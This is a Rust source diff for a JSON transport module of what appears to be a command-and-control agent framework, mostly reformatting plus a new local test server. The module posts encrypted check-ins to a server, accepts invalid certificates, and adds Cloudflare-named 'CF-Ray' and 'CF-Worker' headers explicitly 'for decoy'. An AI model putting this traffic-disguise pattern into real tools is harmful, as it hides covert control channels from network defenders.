@@ -12,235 +12,253 @@ use rs2_communication_protocol::sender::Sender;
 
 /// Define the JSON protocol for sending and receiving data.
 pub struct JsonProtocol {
-    /// The HTTP client used to send requests. This is an instance of the reqwest crate.
-    /// It is configured to accept invalid certificates, use a maximum of 2 idle connections per host,
-    /// and have a timeout of 30 seconds.
-    /// It's also forced to uses the rustls TLS backend.
-    ///
-    /// Initiating a client allows for the creation of keep-alive connections, which can be reused
-    /// for multiple requests, reducing the overhead of establishing a new connection for each
-    /// request and improving performance.
-    client: Client,
-    /// A flag indicating whether the protocol is used for checkin.
-    /// This is used to determine whether the checkin endpoint should be appended to the URL.
-    /// It's automatically reset to false after each request.
-    is_checkin: bool,
-    /// The base URL for the protocol. This is the URL to which requests are sent.
-    base_url: String,
-    /// The global encryptor used to encrypt and decrypt data.
-    /// This is used only if an encryptor is not provided when sending or receiving data.
-    /// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as fallback;
-    /// if the global encryptor is not set, data is sent and received without encryption.
-    global_encryptor: Option<Box<dyn Encryptor>>,
+	/// The HTTP client used to send requests. This is an instance of the reqwest crate.
+	/// It is configured to accept invalid certificates, use a maximum of 2 idle connections per host,
+	/// and have a timeout of 30 seconds.
+	/// It's also forced to uses the rustls TLS backend.
+	///
+	/// Initiating a client allows for the creation of keep-alive connections, which can be reused
+	/// for multiple requests, reducing the overhead of establishing a new connection for each
+	/// request and improving performance.
+	client: Client,
+	/// A flag indicating whether the protocol is used for checkin.
+	/// This is used to determine whether the checkin endpoint should be appended to the URL.
+	/// It's automatically reset to false after each request.
+	is_checkin: bool,
+	/// The base URL for the protocol. This is the URL to which requests are sent.
+	base_url: String,
+	/// The global encryptor used to encrypt and decrypt data.
+	/// This is used only if an encryptor is not provided when sending or receiving data.
+	/// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as fallback;
+	/// if the global encryptor is not set, data is sent and received without encryption.
+	global_encryptor: Option<Box<dyn Encryptor>>,
 }
 
 unsafe impl Send for JsonProtocol {}
 
 impl JsonProtocol {
-    /// Create a new JSON protocol.
-    pub fn new(base_url: String) -> Self {
-        JsonProtocol {
-            client: ClientBuilder::new()
-                .danger_accept_invalid_certs(true)
-                .pool_max_idle_per_host(2)
-                .timeout(std::time::Duration::from_secs(30))
-                .use_rustls_tls()
-                .build()
-                .unwrap(),
-            is_checkin: false,
-            base_url,
-            global_encryptor: None,
-        }
-    }
+	/// Create a new JSON protocol.
+	pub fn new(base_url: String) -> Self {
+		JsonProtocol {
+			client: ClientBuilder::new()
+				.danger_accept_invalid_certs(true)
+				.pool_max_idle_per_host(2)
+				.timeout(std::time::Duration::from_secs(30))
+				.use_rustls_tls()
+				.build()
+				.unwrap(),
+			is_checkin: false,
+			base_url,
+			global_encryptor: None,
+		}
+	}
 
-    /// Set the global encryptor used to encrypt and decrypt data.
-    pub fn set_global_encryptor(&mut self, encryptor: Option<Box<dyn Encryptor>>) -> &Self {
-        self.global_encryptor = encryptor;
+	/// Set the global encryptor used to encrypt and decrypt data.
+	pub fn set_global_encryptor(&mut self, encryptor: Option<Box<dyn Encryptor>>) -> &Self {
+		self.global_encryptor = encryptor;
 
-        self
-    }
+		self
+	}
 
-    /// Get the encryptor to use for encryption or decryption, falling back to the global encryptor
-    /// if necessary.
-    fn encryptor_or_global<'a, E>(&'a self, encryptor: Option<&'a E>) -> Option<&'a dyn Encryptor>
-        where E: Encryptor {
-        encryptor.map(|e| e as &dyn Encryptor).or(
-            if let Some(encryptor) = self.global_encryptor.as_ref() {
-                Some(encryptor.as_ref())
-            } else {
-                None
-            }
-        )
-    }
+	/// Get the encryptor to use for encryption or decryption, falling back to the global encryptor
+	/// if necessary.
+	fn encryptor_or_global<'a, E>(&'a self, encryptor: Option<&'a E>) -> Option<&'a dyn Encryptor>
+		where E: Encryptor {
+		encryptor.map(|e| e as &dyn Encryptor).or(
+			if let Some(encryptor) = self.global_encryptor.as_ref() {
+				Some(encryptor.as_ref())
+			} else {
+				None
+			}
+		)
+	}
 }
 
 impl Sender for JsonProtocol {
-    fn set_is_checkin(&mut self, is_checkin: bool) -> &Self {
-        self.is_checkin = is_checkin;
+	fn set_is_checkin(&mut self, is_checkin: bool) -> &Self {
+		self.is_checkin = is_checkin;
 
-        self
-    }
+		self
+	}
 
-    async fn send(&mut self, data: Bytes, metadata: Metadata) -> Result<Bytes, Box<dyn Error>> {
-        let mut url = self.base_url.clone();
+	async fn send(&mut self, data: Bytes, metadata: Metadata) -> Result<Bytes, Box<dyn Error>> {
+		let mut url = self.base_url.clone();
 
-        // Ensure the URL ends with a slash.
-        if !url.ends_with('/') {
-            url.push('/');
-        }
+		// Ensure the URL ends with a slash.
+		if !url.ends_with('/') {
+			url.push('/');
+		}
 
-        // Append the checkin endpoint to the URL if necessary
-        if self.is_checkin {
-            url.push_str("checkin/");
-        }
+		// Append the checkin endpoint to the URL if necessary
+		if self.is_checkin {
+			url.push_str("checkin/");
+		}
 
-        // Append the path to the URL if it is provided.
-        if let Some(ref path) = metadata.path {
-            url.push_str(&path);
-        }
+		// Append the path to the URL if it is provided.
+		if let Some(ref path) = metadata.path {
+			url.push_str(&path);
+		}
 
-        // Reset the checkin flag after each request, here the request has not been sent yet but
-        // the flag is reset to avoid it being set for the next request in case of errors.
-        self.set_is_checkin(false);
+		// Reset the checkin flag after each request, here the request has not been sent yet but
+		// the flag is reset to avoid it being set for the next request in case of errors.
+		self.set_is_checkin(false);
 
-        #[cfg(test)] {
-            use rs2_communication_protocol::sender::terminal_sender::TerminalSender;
-            TerminalSender::new().send(data.clone(), metadata.clone()).await?;
-            return Ok(data);
-        }
-        #[cfg(not(test))] {
-            let response = self.client.post(&url)
-                .body(data.to_vec())
-                .header("Content-Type", "text/plain")
-                // Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
-                .header("CF-Ray", metadata.request_id.to_string())
-                // Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
-                .header("CF-Worker", metadata.command_id.to_string())
-                .send()
-                .await?;
+		let response = self.client.post(&url)
+		                   .body(data.to_vec())
+		                   .header("Content-Type", "text/plain")
+			// Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
+			               .header("CF-Ray", metadata.request_id.to_string())
+			// Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
+			               .header("CF-Worker", metadata.command_id.to_string())
+		                   .send()
+		                   .await?;
 
-            Ok(response.bytes().await?)
-        }
-    }
+		Ok(response.bytes().await?)
+	}
 }
 
 impl Protocol for JsonProtocol {
-    fn read<S, E>(&self, data: Bytes, encryptor: Option<E>) -> Result<S, Box<dyn Error>>
-        where S: DeserializeOwned,
-              E: Encryptor {
-        // Use the global encryptor if an encryptor is not provided.
-        let encryptor = self.encryptor_or_global(encryptor.as_ref());
+	fn read<S, E>(&self, data: Bytes, encryptor: Option<E>) -> Result<S, Box<dyn Error>>
+		where S: DeserializeOwned,
+		      E: Encryptor {
+		// Use the global encryptor if an encryptor is not provided.
+		let encryptor = self.encryptor_or_global(encryptor.as_ref());
 
-        // Decrypt the data if an encryptor is provided.
-        let data = if let Some(encryptor) = encryptor {
-            encryptor.decrypt(data)?
-        } else {
-            data
-        };
+		// Decrypt the data if an encryptor is provided.
+		let data = if let Some(encryptor) = encryptor {
+			encryptor.decrypt(data)?
+		} else {
+			data
+		};
 
-        serde_json::from_slice(data.iter().as_slice()).map_err(|e| e.into())
-    }
+		serde_json::from_slice(data.iter().as_slice()).map_err(|e| e.into())
+	}
 
-    async fn write<D, E>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes, Box<dyn Error>>
-        where D: Serialize + WithMetadata + Send,
-              E: Encryptor + Send {
-        let metadata = data.get_metadata();
-        let data = Bytes::from(serde_json::to_vec(&data)?);
+	async fn write<D, E>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes, Box<dyn Error>>
+		where D: Serialize + WithMetadata + Send,
+		      E: Encryptor + Send {
+		let metadata = data.get_metadata();
+		let data = Bytes::from(serde_json::to_vec(&data)?);
 
-        // Use the global encryptor if an encryptor is not provided.
-        let encryptor = self.encryptor_or_global(encryptor.as_ref());
+		// Use the global encryptor if an encryptor is not provided.
+		let encryptor = self.encryptor_or_global(encryptor.as_ref());
 
-        // Encrypt the data if an encryptor is provided.
-        let data = if let Some(encryptor) = encryptor {
-            encryptor.encrypt(data)?
-        } else {
-            data
-        };
+		// Encrypt the data if an encryptor is provided.
+		let data = if let Some(encryptor) = encryptor {
+			encryptor.encrypt(data)?
+		} else {
+			data
+		};
 
-        self.send(data, metadata).await
-    }
+		self.send(data, metadata).await
+	}
 }
 
 #[cfg(test)]
 mod tests {
-    use std::future::Future;
-    use std::io;
-    use std::sync::{Arc, Mutex};
+	use std::future::Future;
+	use std::io;
+	use std::sync::{Arc, Mutex};
 
-    use serde::Deserialize;
-    use uuid::uuid;
+	use axum::handler::Handler;
+	use axum::http::HeaderMap;
+	use axum::Router;
+	use axum::routing::get;
+	use serde::Deserialize;
+	use tokio::select;
+	use tokio_util::sync::CancellationToken;
+	use uuid::uuid;
 
-    use rs2_communication_protocol::encryptor::ident_encryptor::IdentEncryptor;
+	use rs2_communication_protocol::encryptor::ident_encryptor::IdentEncryptor;
 
-    use super::*;
+	use super::*;
 
-    /// Capture the output of a closure that writes to stdout.
-    async fn capture_stdout<F: Future + Send + 'static>(f: F) -> String {
-        // Mutex to capture the output.
-        let output = Arc::new(Mutex::new(Vec::new()));
-        let output_clone = output.clone();
+	/// Capture the output of a closure that writes to stdout.
+	async fn capture_stdout<F: Future + Send + 'static>(f: F) -> String {
+		// Mutex to capture the output.
+		let output = Arc::new(Mutex::new(Vec::new()));
+		let output_clone = output.clone();
 
-        // Redirect stdout to our output mutex.
-        let old_stdout = io::set_output_capture(Some(output.clone()));
+		// Redirect stdout to our output mutex.
+		let old_stdout = io::set_output_capture(Some(output.clone()));
 
-        let handle = tokio::spawn(async move {
-            f.await;
-        });
-        handle.await.unwrap();
+		let handle = tokio::spawn(async move {
+			f.await;
+		});
+		handle.await.unwrap();
 
-        // Restore the original stdout.
-        io::set_output_capture(old_stdout);
+		// Restore the original stdout.
+		io::set_output_capture(old_stdout);
 
-        // Collect the output and convert it to a String.
-        let output = output_clone.lock().unwrap();
-        String::from_utf8_lossy(&output).to_string()
-    }
+		// Collect the output and convert it to a String.
+		let output = output_clone.lock().unwrap();
+		String::from_utf8_lossy(&output).to_string()
+	}
 
-    #[derive(Serialize, Deserialize)]
-    struct SampleData {
-        foo: String,
-    }
+	async fn make_dummy_server(cancellation_token: CancellationToken, router: Router<()>) {
+		let listener = tokio::net::TcpListener::bind("127.0.0.1:8080").await.unwrap();
 
-    impl WithMetadata for SampleData {
-        fn get_metadata(&self) -> Metadata {
-            Metadata {
-                request_id: uuid!("00000000-0000-0000-0000-000000000000"),
-                command_id: uuid!("00000000-0000-0000-0000-000000000000"),
-                path: None,
-            }
-        }
-    }
+		axum::serve(listener, router)
+			.with_graceful_shutdown(async move {
+				select! {
+					_ = cancellation_token.cancelled() => {},
+				}
+			})
+			.await
+			.unwrap();
+	}
 
-    #[test]
-    fn test_read() {
-        let protocol = JsonProtocol::new("http://localhost:8080".to_string());
-        let encryptor = IdentEncryptor;
-        let data = Bytes::from("{\"foo\":\"bar\"}");
-        let result = protocol.read::<SampleData, _>(data, Some(encryptor));
-        assert!(result.is_ok());
-        let value = result.unwrap();
-        assert_eq!(value.foo, "bar");
-    }
+	#[derive(Serialize, Deserialize)]
+	struct SampleData {
+		foo: String,
+	}
 
-    #[tokio::test]
-    async fn test_write() {
-        let mut protocol = JsonProtocol::new("http://localhost:8080".to_string());
-        let encryptor = IdentEncryptor;
-        let data = SampleData { foo: "bar".to_string() };
+	impl WithMetadata for SampleData {
+		fn get_metadata(&self) -> Metadata {
+			Metadata {
+				request_id: uuid!("00000000-0000-0000-0000-000000000000"),
+				command_id: uuid!("00000000-0000-0000-0000-000000000000"),
+				path: None,
+			}
+		}
+	}
 
-        let output = capture_stdout(async move {
-            let result = protocol.write(data, Some(encryptor)).await;
-            assert!(result.is_ok());
-        }).await;
+	#[test]
+	fn test_read() {
+		let protocol = JsonProtocol::new("http://localhost:8080".to_string());
+		let encryptor = IdentEncryptor;
+		let data = Bytes::from("{\"foo\":\"bar\"}");
+		let result = protocol.read::<SampleData, _>(data, Some(encryptor));
+		assert!(result.is_ok());
+		let value = result.unwrap();
+		assert_eq!(value.foo, "bar");
+	}
 
-        assert_eq!(output, "[123, 34, 102, 111, 111, 34, 58, 34, 98, 97, 114, 34, 125]\n");
+	#[tokio::test]
+	async fn test_write() {
+		let cancellation_token = CancellationToken::new();
+		let handler = |headers: HeaderMap, body: Bytes| async move {
+			assert_eq!(headers.get("content-type").unwrap(), "text/plain");
+			assert_eq!(headers.get("cf-ray").unwrap(), "00000000-0000-0000-0000-000000000000");
+			assert_eq!(headers.get("cf-worker").unwrap(), "00000000-0000-0000-0000-000000000000");
+			assert_eq!(body, Bytes::from("{\"foo\":\"bar\"}"));
+			"Ok"
+		};
+		let router = Router::new()
+			.route("/", get(handler).post(handler));
 
-        // Print the output for debugging.
-        println!("Output: {}", output.trim()
-            .trim_matches(['[', ']'])
-            .split(',')
-            .map(|s| char::from_u32(s.trim().parse::<u32>().unwrap()).unwrap())
-            .collect::<String>()
-        );
-    }
+		let call = make_dummy_server(cancellation_token.clone(), router);
+		let server_handle = tokio::spawn(async move {
+			call.await;
+		});
+
+		let mut protocol = JsonProtocol::new("http://localhost:8080".to_string());
+		let encryptor = IdentEncryptor;
+		let data = SampleData { foo: "bar".to_string() };
+
+		let result = protocol.write(data, Some(encryptor)).await;
+
+		cancellation_token.cancel();
+		server_handle.await.unwrap();
+	}
 }
